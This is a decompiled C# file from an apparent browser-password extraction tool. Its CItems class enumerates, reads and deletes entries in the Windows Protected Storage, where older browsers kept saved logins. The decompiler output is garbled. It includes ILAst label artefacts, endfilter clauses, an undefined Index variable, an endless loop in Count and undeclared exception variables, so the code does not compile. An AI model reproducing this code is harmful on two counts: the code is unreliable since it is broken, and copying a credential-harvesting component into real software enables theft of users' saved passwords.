using System;
using System.Collections;
using System.Runtime.InteropServices;
using BrowserPasswords.PStoreLib;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace BrowserPasswords
{
	// Token: 0x02000041 RID: 65
	internal class CItems : CUtils, IEnumerable, IEnumerator
	{
		// Token: 0x06000198 RID: 408 RVA: 0x00005E14 File Offset: 0x00004014
		internal CItems(IPStore PStore, PST_KEY KeyType, ref Guid guidType, ref Guid guidSubType)
		{
			this.m_TypeGuid = default(Guid);
			this.m_SubTypeGuid = default(Guid);
			if (PStore != null)
			{
				this.m_IPStore = PStore;
				this.m_KeyType = KeyType;
				this.m_TypeGuid = guidType;
				this.m_SubTypeGuid = guidSubType;
				this.m_IEnumItem = PStore.EnumItems(KeyType, ref guidType, ref guidSubType, 0);
			}
		}

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x06000199 RID: 409 RVA: 0x00005E7C File Offset: 0x0000407C
		public CItem Item
		{
			get
			{
				int num;
				CItem citem;
				int num4;
				object obj;
				try
				{
					ProjectData.ClearProjectError();
					num = 2;
					this.m_IEnumItem.Reset();
					this.m_IEnumItem.Skip(Index);
					int num2;
					int num3;
					this.m_IEnumItem.Next(1, ref num2, ref num3);
					citem = null;
					if (num2 != 0)
					{
						citem = new CItem();
						CItem citem2 = citem;
						IPStore ipstore = this.m_IPStore;
						PST_KEY keyType = this.m_KeyType;
						IntPtr ptr = new IntPtr(num2);
						citem2.Init(ipstore, keyType, ref this.m_TypeGuid, ref this.m_SubTypeGuid, this.CopyString(ptr));
						ptr = new IntPtr(num2);
						Marshal.FreeCoTaskMem(ptr);
					}
					IL_77:
					goto IL_BE;
					IL_79:
					num4 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
					IL_8F:;
				}
				catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
				{
					Exception ex = (Exception)obj2;
					goto IL_79;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_BE:
				CItem result = citem;
				if (num4 != 0)
				{
					ProjectData.ClearProjectError();
				}
				return result;
			}
		}

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x0600019A RID: 410 RVA: 0x00005F64 File Offset: 0x00004164
		public int Count
		{
			get
			{
				checked
				{
					int num;
					int num2;
					int num3;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num = 2;
						this.m_IEnumItem.Reset();
						for (;;)
						{
							this.m_IEnumItem.Skip(1);
							num2++;
						}
						IL_27:
						goto IL_6A;
						IL_29:
						num3 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
						IL_3D:;
					}
					catch when (endfilter(obj is Exception & num != 0 & num3 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_29;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_6A:
					int result = num2;
					if (num3 != 0)
					{
						ProjectData.ClearProjectError();
					}
					return result;
				}
			}
		}

		// Token: 0x0600019B RID: 411 RVA: 0x00005FF4 File Offset: 0x000041F4
		public void Delete(string szItemName)
		{
			this.m_IPStore.DeleteItem(this.m_KeyType, ref this.m_TypeGuid, ref this.m_SubTypeGuid, szItemName, 0, 0);
		}

		// Token: 0x0600019C RID: 412 RVA: 0x00006018 File Offset: 0x00004218
		public void Add(Guid guidType, Guid guidSubType, string szItemName)
		{
		}

		// Token: 0x0600019D RID: 413 RVA: 0x0000601C File Offset: 0x0000421C
		public byte[] ReadItem(Guid guidItemType, Guid guidItemSubType, string szItemName)
		{
			int num;
			byte[] array2;
			int num3;
			object obj;
			try
			{
				byte[] array = null;
				ProjectData.ClearProjectError();
				num = 2;
				int num2;
				IntPtr intPtr;
				this.m_IPStore.ReadItem(this.m_KeyType, ref guidItemType, ref guidItemSubType, szItemName, ref num2, ref intPtr, 0, 0);
				if (intPtr != IntPtr.Zero)
				{
					array = new byte[checked(num2 - 1 + 1)];
					Marshal.Copy(intPtr, array, 0, num2);
					Marshal.FreeCoTaskMem(intPtr);
				}
				array2 = array;
				goto IL_AC;
				IL_53:
				Interaction.MsgBox(Information.Err().Description, MsgBoxStyle.OkOnly, null);
				goto IL_AC;
				IL_67:
				num3 = -1;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_7D:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num3 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_67;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			IL_AC:
			byte[] result = array2;
			if (num3 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x0600019E RID: 414 RVA: 0x000060F0 File Offset: 0x000042F0
		public IEnumerator GetEnumerator()
		{
			this.Reset();
			return this;
		}

		// Token: 0x0600019F RID: 415 RVA: 0x00006108 File Offset: 0x00004308
		public void Reset()
		{
			if (this.m_IEnumItem != null)
			{
				this.m_IEnumItem.Reset();
			}
		}

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x060001A0 RID: 416 RVA: 0x00006120 File Offset: 0x00004320
		public object Current
		{
			get
			{
				return this.m_Current;
			}
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x00006138 File Offset: 0x00004338
		public bool MoveNext()
		{
			bool result;
			if (this.m_IEnumItem == null)
			{
				result = false;
			}
			else
			{
				int num2;
				int num3;
				int num = this.m_IEnumItem.Next(1, ref num2, ref num3);
				if (num != 0)
				{
					result = false;
				}
				else
				{
					if (num2 != 0)
					{
						this.m_Current = new CItem();
						CItem current = this.m_Current;
						IPStore ipstore = this.m_IPStore;
						PST_KEY keyType = this.m_KeyType;
						IntPtr ptr = new IntPtr(num2);
						current.Init(ipstore, keyType, ref this.m_TypeGuid, ref this.m_SubTypeGuid, this.CopyString(ptr));
						ptr = new IntPtr(num2);
						Marshal.FreeCoTaskMem(ptr);
					}
					result = true;
				}
			}
			return result;
		}

		// Token: 0x0400018F RID: 399
		private IPStore m_IPStore;

		// Token: 0x04000190 RID: 400
		private PST_KEY m_KeyType;

		// Token: 0x04000191 RID: 401
		private Guid m_TypeGuid;

		// Token: 0x04000192 RID: 402
		private Guid m_SubTypeGuid;

		// Token: 0x04000193 RID: 403
		private IEnumPStoreItems m_IEnumItem;

		// Token: 0x04000194 RID: 404
		private CItem m_Current;
	}
}
